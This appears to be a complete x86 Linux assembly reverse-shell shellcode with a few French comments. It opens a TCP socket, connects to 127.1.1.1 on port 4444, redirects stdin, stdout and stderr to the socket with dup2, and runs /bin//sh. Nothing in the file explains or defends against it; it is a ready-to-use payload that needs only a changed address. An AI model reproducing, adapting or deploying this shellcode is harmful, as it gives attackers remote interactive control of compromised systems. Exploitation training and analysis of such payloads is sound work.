global _start

section .text
_start:

	push 0x66
	pop eax
	push 0x1
	pop ebx

	xor edx,edx

	push edx
	push ebx
	push 0x2
	mov ecx,esp
	int 0x80
	xchg edx,eax

	mov al,0x66
	push 0x0101017F
	push word 0x5c11
	mov bl,0x2
	push word bx
	mov ecx,esp

	push 0x10
	push ecx
	push edx
	
	mov ecx,esp
	
	mov bl,0x3
	int 0x80

	push 0x2 ; intitialiser le computer pour la boucle ( stdin,.... ) = ( 0,1,2 )
	pop ecx
	xchg ebx,edx ; ebx argument de sys_dup2 qui contient l'ancient file descriptor

	loop:
		mov al,0x3F
		int 0x80
		dec ecx
		jns loop

	mov al,0x0b
	inc ecx
	mov edx,ecx
	
	push edx
	push 0x68732f2f	;"hs//"
	push 0x6e69622f	;"nib/"
	mov ebx,esp

	int 0x80

